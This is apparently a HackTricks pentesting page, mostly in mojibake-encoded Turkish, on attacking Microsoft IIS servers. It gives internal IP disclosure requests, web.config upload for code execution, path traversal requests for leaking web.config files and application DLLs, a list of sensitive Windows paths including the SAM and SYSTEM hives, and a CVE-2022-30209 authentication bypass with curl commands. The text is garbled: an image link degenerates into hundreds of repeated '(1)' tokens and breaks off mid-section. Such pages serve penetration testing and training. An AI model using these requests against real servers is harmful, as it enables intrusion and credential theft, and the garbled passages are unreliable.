# IIS - Internet Bilgi Servisleri

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELÄ°K PLANLARINA**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

Test edilebilir dosya uzantÄ±larÄ±:

* asp
* aspx
* config
* php

## Dahili IP Adresi ifÅŸasÄ±

302 alÄ±nan herhangi bir IIS sunucusunda, Host baÅŸlÄ±ÄŸÄ±nÄ± kaldÄ±rmayÄ± deneyebilir ve HTTP/1.0 kullanarak iÃ§erideki yanÄ±tta Location baÅŸlÄ±ÄŸÄ± size dahili IP adresini gÃ¶sterebilir:
```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```
**English:**

If the server is misconfigured, it may disclose its internal IP address in the HTTP response headers. This can happen if the server is behind a reverse proxy or load balancer that is not properly configured. Attackers can use this information to gain knowledge about the internal network structure and potentially launch further attacks.

**Turkish:**

EÄŸer sunucu yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸsa, HTTP yanÄ±t baÅŸlÄ±klarÄ±nda dahili IP adresini aÃ§Ä±klayabilir. Bu durum, sunucunun dÃ¼zgÃ¼n yapÄ±landÄ±rÄ±lmamÄ±ÅŸ bir ters proxy veya yÃ¼k dengeleyici arkasÄ±nda olmasÄ± durumunda gerÃ§ekleÅŸebilir. SaldÄ±rganlar bu bilgiyi kullanarak dahili aÄŸ yapÄ±sÄ± hakkÄ±nda bilgi edinebilir ve potansiyel olarak daha fazla saldÄ±rÄ± baÅŸlatabilir.
```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```
## .config dosyalarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rma

.config dosyalarÄ±nÄ± yÃ¼kleyebilir ve bunlarÄ± kodu Ã§alÄ±ÅŸtÄ±rmak iÃ§in kullanabilirsiniz. Bunun bir yolu, kodu dosyanÄ±n sonuna bir HTML yorumu iÃ§inde eklemektir: [Ã–rneÄŸi buradan indirin](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

Bu zafiyeti sÃ¶mÃ¼rmek iÃ§in daha fazla bilgi ve teknikler [burada](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/) bulunmaktadÄ±r.

## IIS KeÅŸif Bruteforce

OluÅŸturduÄŸum listeyi indirin:

{% file src="../../.gitbook/assets/iisfinal.txt" %}

Bu liste aÅŸaÄŸÄ±daki listelerin iÃ§eriÄŸini birleÅŸtirerek oluÅŸturuldu:

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

UzantÄ± eklemeksizin kullanÄ±n, ihtiyaÃ§ duyan dosyalar zaten uzantÄ±ya sahiptir.

## Yol GeÃ§iÅŸi

### Kaynak kodu sÄ±zdÄ±rma

Tam aÃ§Ä±klamayÄ± burada kontrol edin: [https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)

{% hint style="info" %}
Ã–zet olarak, uygulamanÄ±n klasÃ¶rlerinin iÃ§inde "**assemblyIdentity**" dosyalarÄ± ve "**namespaces**" referanslarÄ± iÃ§eren birÃ§ok web.config dosyasÄ± bulunmaktadÄ±r. Bu bilgilerle **yÃ¼rÃ¼tÃ¼lebilir dosyalarÄ±n nerede bulunduÄŸunu** ve onlarÄ± indirebileceÄŸinizi Ã¶ÄŸrenebilirsiniz.\
Ä°ndirilen Dll'lerden ayrÄ±ca, eriÅŸmeye Ã§alÄ±ÅŸmanÄ±z gereken **yeni namespaces** bulabilir ve yeni namespaces ve assemblyIdentity'leri bulmak iÃ§in web.config dosyasÄ±nÄ± alabilirsiniz.\
AyrÄ±ca, **connectionstrings.config** ve **global.asax** dosyalarÄ±nÄ±n ilginÃ§ bilgiler iÃ§erebileceÄŸini unutmayÄ±n.\

{% endhint %}

**.Net MVC uygulamalarÄ±nda**, **web.config** dosyasÄ±, uygulamanÄ±n her bir ikili dosyasÄ±nÄ± "**assemblyIdentity**" XML etiketleri aracÄ±lÄ±ÄŸÄ±yla belirleyerek Ã¶nemli bir rol oynar.

### **Ä°kili DosyalarÄ± KeÅŸfetme**

AÅŸaÄŸÄ±da, **web.config** dosyasÄ±na eriÅŸimin bir Ã¶rneÄŸi gÃ¶sterilmektedir:
```markup
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```
Bu istek Ã§eÅŸitli ayarlarÄ± ve baÄŸÄ±mlÄ±lÄ±klarÄ± ortaya Ã§Ä±karÄ±r, Ã¶rneÄŸin:

- **EntityFramework** sÃ¼rÃ¼mÃ¼
- Web sayfalarÄ±, istemci doÄŸrulama ve JavaScript iÃ§in **AppSettings**
- Kimlik doÄŸrulama ve Ã§alÄ±ÅŸma zamanÄ± iÃ§in **System.web** yapÄ±landÄ±rmalarÄ±
- ModÃ¼ller ayarlarÄ± iÃ§in **System.webServer**
- **Microsoft.Owin**, **Newtonsoft.Json** ve **System.Web.Mvc** gibi birÃ§ok kÃ¼tÃ¼phane iÃ§in **Runtime** derleme baÄŸlantÄ±larÄ±

Bu ayarlar, **/bin/WebGrease.dll** gibi belirli dosyalarÄ±n uygulamanÄ±n /bin klasÃ¶rÃ¼nde bulunduÄŸunu gÃ¶sterir.

### **KÃ¶k Dizin DosyalarÄ±**

**/global.asax** ve hassas parolalar iÃ§eren **/connectionstrings.config** gibi kÃ¶k dizinde bulunan dosyalar, uygulamanÄ±n yapÄ±landÄ±rmasÄ± ve iÅŸleyiÅŸi iÃ§in Ã¶nemlidir.

### **Ä°sim UzaylarÄ± ve Web.Config**

MVC uygulamalarÄ±, her dosyada tekrarlayan bildirimleri Ã¶nlemek iÃ§in belirli isim uzaylarÄ± iÃ§in ek **web.config dosyalarÄ±** da tanÄ±mlar. Bu, baÅŸka bir **web.config** dosyasÄ±nÄ± indirmek iÃ§in yapÄ±lan bir istekle gÃ¶sterilir:
```markup
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
```
### **DLL'leri Ä°ndirme**

Ã–zel bir ad alanÄ±nÄ±n bahsedilmesi, /bin dizininde bulunan "**WebApplication1**" adlÄ± bir DLL'nin varlÄ±ÄŸÄ±nÄ± iÅŸaret eder. Buna gÃ¶re, **WebApplication1.dll**'nin indirilmesi iÃ§in bir istek gÃ¶sterilir:
```markup
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
```
Bu, /bin dizininde **System.Web.Mvc.dll** ve **System.Web.Optimization.dll** gibi diÄŸer Ã¶nemli DLL'lerin varlÄ±ÄŸÄ±nÄ± Ã¶nermektedir.

Bir DLL'in **WebApplication1.Areas.Minded** adÄ±nda bir ad alanÄ±nÄ± iÃ§e aktardÄ±ÄŸÄ± bir senaryoda, saldÄ±rgan, **/alan-adÄ±/GÃ¶rÃ¼nÃ¼mler/** gibi tahmin edilebilir yollarda diÄŸer web.config dosyalarÄ±nÄ±n varlÄ±ÄŸÄ±nÄ± Ã§Ä±karabilir. Bu dosyalar, /bin klasÃ¶rÃ¼ndeki diÄŸer DLL'lerin belirli yapÄ±landÄ±rmalarÄ±nÄ± ve referanslarÄ±nÄ± iÃ§erebilir. Ã–rneÄŸin, **/Minded/GÃ¶rÃ¼nÃ¼mler/web.config** isteÄŸi, baÅŸka bir DLL olan **WebApplication1.AdditionalFeatures.dll**'nin varlÄ±ÄŸÄ±nÄ± gÃ¶steren yapÄ±landÄ±rmalarÄ± ve ad alanlarÄ±nÄ± ortaya Ã§Ä±karabilir.

### Ortak dosyalar

[Buradan](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/) alÄ±nmÄ±ÅŸtÄ±r
```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```
## HTTPAPI 2.0 404 HatasÄ±

EÄŸer aÅŸaÄŸÄ±daki gibi bir hata gÃ¶rÃ¼yorsanÄ±z:

![](<../../.gitbook/assets/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (
```python
# script for sanity check
> type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```
<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong> ile Ã¶ÄŸrenin!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELÄ°K PLANLARINA**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
